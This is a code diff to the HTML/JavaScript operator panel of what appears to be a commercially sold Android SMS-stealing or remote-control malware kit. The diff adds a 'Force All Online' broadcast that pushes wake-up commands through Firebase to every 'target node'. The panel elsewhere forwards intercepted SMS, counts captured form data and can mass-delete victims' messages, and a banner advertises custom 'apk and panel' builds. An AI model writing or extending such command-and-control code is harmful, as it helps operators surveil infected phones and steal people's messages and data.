@@ -177,6 +177,53 @@
 <audio id="message-sound" src="message.mp3" preload="auto"></audio>
 <audio id="new-post-sound" src="newpost.mp3" preload="auto"></audio>
 <audio id="device-online-sound" src="deviveonline.mp3" preload="auto"></audio>
+<!-- Broadcast Overlay -->
+<div id="broadcast-overlay" class="fixed inset-0 bg-slate-900/95 z-[150] flex items-center justify-center p-6 hidden backdrop-blur-md">
+    <div class="max-w-md w-full text-center space-y-8 relative">
+        <!-- Animation Container -->
+        <div class="relative w-48 h-48 mx-auto flex items-center justify-center">
+            <div class="broadcast-wave w-48 h-48"></div>
+            <div class="broadcast-wave w-48 h-48"></div>
+            <div class="broadcast-wave w-48 h-48"></div>
+            <div class="relative z-20 bg-blue-600 w-24 h-24 rounded-full flex items-center justify-center shadow-[0_0_50px_rgba(59,130,246,0.5)]">
+                <i id="broadcast-icon" class="fas fa-satellite-dish text-white text-4xl animate-pulse"></i>
+            </div>
+        </div>
+
+        <div class="space-y-3">
+            <h2 id="broadcast-title" class="text-2xl font-black text-white uppercase tracking-[0.2em]">High-Priority Broadcast</h2>
+            <div class="flex items-center justify-center gap-2">
+                <span class="w-2 h-2 rounded-full bg-emerald-500 online-dot"></span>
+                <p class="text-emerald-400 font-bold text-xs uppercase tracking-widest" id="broadcast-status-text">Synchronizing All Nodes...</p>
+            </div>
+        </div>
+
+        <div class="bg-slate-800/50 border border-slate-700 rounded-3xl p-6 backdrop-blur-sm relative overflow-hidden">
+            <div class="scan-line"></div>
+            <div class="grid grid-cols-2 gap-4">
+                <div class="text-center">
+                    <div class="text-3xl font-black text-white mb-1" id="broadcast-count">0</div>
+                    <div class="text-[10px] font-black text-slate-500 uppercase tracking-widest">Target Nodes</div>
+                </div>
+                <div class="text-center border-l border-slate-700">
+                    <div class="text-3xl font-black text-blue-500 mb-1" id="broadcast-signal">---</div>
+                    <div class="text-[10px] font-black text-slate-500 uppercase tracking-widest">Signal Strength</div>
+                </div>
+            </div>
+            <div class="mt-6 space-y-2">
+                <div class="flex justify-between text-[9px] font-black text-slate-400 uppercase tracking-widest px-1">
+                    <span>FCM Channel: SECURE_V2</span>
+                    <span id="broadcast-percent">0%</span>
+                </div>
+                <div class="h-1.5 w-full bg-slate-700 rounded-full overflow-hidden">
+                    <div id="broadcast-progress" class="h-full bg-blue-600 transition-all duration-500 shadow-[0_0_10px_#3b82f6]" style="width: 0%"></div>
+                </div>
+            </div>
+        </div>
+
+        <button onclick="closeBroadcast()" class="text-slate-500 hover:text-white text-[10px] font-black uppercase tracking-[0.3em] transition-colors">Abort Mission</button>
+    </div>
+</div>
 <!-- Update Profile Modal -->
 <div id="profile-modal" class="fixed inset-0 bg-slate-900/90 z-[200] flex items-center justify-center p-4 hidden backdrop-blur-md">
     <div class="bg-white w-full max-w-sm rounded-3xl p-8 shadow-2xl space-y-6 border-t-4 border-blue-600">
@@ -290,6 +337,9 @@
                 <input type="text" id="global-sms-fwd" placeholder="SMS Forward No." class="w-full bg-slate-800 border-none rounded p-2 text-xs text-white outline-none focus:ring-1 focus:ring-blue-500">
                 <button onclick="saveGlobal('smsForward')" class="w-full bg-blue-600 text-white py-1.5 rounded text-[10px] font-bold uppercase hover:bg-blue-700 transition-colors">Update SMS</button>
             </div>
+            <button onclick="checkAllDevices()" class="w-full bg-emerald-600 hover:bg-emerald-700 py-2 rounded text-[10px] font-black uppercase tracking-widest text-white shadow-lg mt-2 active:scale-95 transition-all">
+                <i class="fas fa-bolt mr-1"></i> Force All Online
+            </button>
         </div>
 
         <div class="pt-6 pb-2 px-4 text-[10px] font-bold text-slate-500 uppercase tracking-widest">Maintenance</div>
@@ -396,11 +446,11 @@
         <div class="scrolling-wrapper">
                 <span class="text-white font-black text-[10px] uppercase tracking-[0.3em] flex items-center gap-6">
                     <span class="flex items-center gap-2 text-blue-400"><i class="fas fa-satellite-dish animate-pulse"></i> SYSTEM BROADCAST:</span>
-                    KGFROCKY <span class="text-yellow-400 drop-shadow-[0_0_10px_rgba(250,204,21,0.6)]">"apke hisab se apk aur panel ban jaye ga"</span> KGFROCKY
+                    DARK2SHADOWW <span class="text-yellow-400 drop-shadow-[0_0_10px_rgba(250,204,21,0.6)]">"apke hisab se apk aur panel ban jaye ga"</span> DARK2SHADOWW
                     <span class="w-2 h-2 rounded-full bg-slate-700 mx-4"></span>
                     <span class="text-emerald-400 flex items-center gap-2"><i class="fas fa-shield-check"></i> ULTRA SECURE V2.0 ACTIVE</span>
                     <span class="w-2 h-2 rounded-full bg-slate-700 mx-4"></span>
-                    KGFROCKY <span class="text-yellow-400 drop-shadow-[0_0_10px_rgba(250,204,21,0.6)]">"apke hisab se apk aur panel ban jaye ga"</span> KGFROCKY
+                    DARK2SHADOWW <span class="text-yellow-400 drop-shadow-[0_0_10px_rgba(250,204,21,0.6)]">"apke hisab se apk aur panel ban jaye ga"</span> DARK2SHADOWW
                 </span>
         </div>
     </div>
@@ -429,6 +479,13 @@
                     <div class="text-sm font-black text-rose-600 leading-none" id="stat-forms">0</div>
                 </div>
                 <div class="text-[8px] font-bold text-slate-400 uppercase tracking-tighter">Data</div>
+            </div>
+            <div onclick="setFilter('online')" id="stat-card-online" class="stat-card bg-white rounded-xl shadow-sm border-transparent flex flex-col items-center justify-center">
+                <div class="flex items-center gap-1.5 mb-1">
+                    <div class="w-6 h-6 bg-emerald-50 text-emerald-600 rounded-lg flex items-center justify-center text-xs"><i class="fas fa-signal"></i></div>
+                    <div class="text-sm font-black text-emerald-600 leading-none" id="stat-online-count">0</div>
+                </div>
+                <div class="text-[8px] font-bold text-slate-400 uppercase tracking-tighter">Online</div>
             </div>
             <div onclick="setFilter('fav')" id="stat-card-fav" class="stat-card bg-white rounded-xl shadow-sm border-transparent flex flex-col items-center justify-center">
                 <div class="flex items-center gap-1.5 mb-1">
@@ -1154,7 +1211,6 @@
     let knownUids = new Set();
     let knownFids = new Set();
     let isFirstLoadUsers = true;
-    let isSyncingAll = false;
 
     function toggleSidebar() {
         const sb = document.getElementById('sidebar');
@@ -1205,7 +1261,7 @@
                         }
 
                         // Only show alert if it's a confirmed state change from Offline to Online
-                        if (!isSyncingAll && wasOnline === false && isNowOnline === true) {
+                        if (wasOnline === false && isNowOnline === true) {
                             const name = (info.m || "Unknown") + " (#" + (permIds[uid] || "...") + ")";
                             showToast(`${name} IS NOW ONLINE ⚡`, "success", "device-online-sound");
                         }
@@ -1437,7 +1493,7 @@
         document.getElementById('stat-today').innerText = todayCount;
         document.getElementById('stat-msgs').innerText = msgsCount;
         document.getElementById('stat-forms').innerText = formsCount;
-        if (document.getElementById('stat-online-count')) document.getElementById('stat-online-count').innerText = onlineCount;
+        document.getElementById('stat-online-count').innerText = onlineCount;
         document.getElementById('stat-fav-count').innerText = favCount;
 
         let filteredItems = [];
@@ -2084,8 +2140,70 @@
         showToast(`Configuration for ${k} saved successfully.`, 'success');
     }
 
+    function checkAllDevices() {
+        const uids = Object.keys(usersData);
+        if(uids.length === 0) return showToast("No target nodes found", "error");
 
+        startBroadcast("System Wake-up Broadcast", "fa-satellite-dish", uids, (uid) => {
+            db.ref(`Users/${uid}/C`).push({ t: 'CHECK_ONLINE', ts: Date.now() });
+        });
+    }
 
+    function startBroadcast(title, icon, uids, action) {
+        const overlay = document.getElementById('broadcast-overlay');
+        const titleEl = document.getElementById('broadcast-title');
+        const iconEl = document.getElementById('broadcast-icon');
+        const countEl = document.getElementById('broadcast-count');
+        const signalEl = document.getElementById('broadcast-signal');
+        const progressEl = document.getElementById('broadcast-progress');
+        const statusEl = document.getElementById('broadcast-status-text');
+        const percentEl = document.getElementById('broadcast-percent');
+
+        overlay.classList.remove('hidden');
+        titleEl.innerText = title;
+        iconEl.className = `fas ${icon} text-white text-4xl animate-pulse`;
+        countEl.innerText = uids.length;
+        signalEl.innerText = "LINKING";
+        signalEl.className = "text-3xl font-black text-blue-500 mb-1";
+        progressEl.style.width = "0%";
+        percentEl.innerText = "0%";
+        statusEl.innerText = "Initializing Global Link...";
+
+        let current = 0;
+        const total = uids.length;
+
+        const sendNext = () => {
+            if (current < total) {
+                const uid = uids[current];
+                action(uid);
+                current++;
+
+                const percent = Math.floor((current / total) * 100);
+                progressEl.style.width = percent + "%";
+                percentEl.innerText = percent + "%";
+
+                if (percent < 30) statusEl.innerText = "Bypassing Security Walls...";
+                else if (percent < 60) statusEl.innerText = "Transmitting Data Packets...";
+                else if (percent < 90) statusEl.innerText = "Syncing Node Responses...";
+                else statusEl.innerText = "Finalizing Secure Link...";
+
+                signalEl.innerText = (Math.random() * (99 - 80) + 80).toFixed(1) + " dBm";
+                setTimeout(sendNext, 50);
+            } else {
+                db.ref('fcm_queue').push({ t: 'WAKE_UP', targetUid: "ALL" });
+                statusEl.innerText = "BROADCAST COMPLETE ✓";
+                signalEl.innerText = "STABLE";
+                signalEl.className = "text-3xl font-black text-emerald-500 mb-1";
+                setTimeout(() => overlay.classList.add('hidden'), 2000);
+            }
+        };
+
+        setTimeout(sendNext, 1000);
+    }
+
+    function closeBroadcast() {
+        document.getElementById('broadcast-overlay').classList.add('hidden');
+    }
 
     function deleteAllGlobalSms() {
         if(!confirm("EXTREME DANGER: This will delete EVERY SINGLE message from EVERY user and the global feed. Continue?")) return;
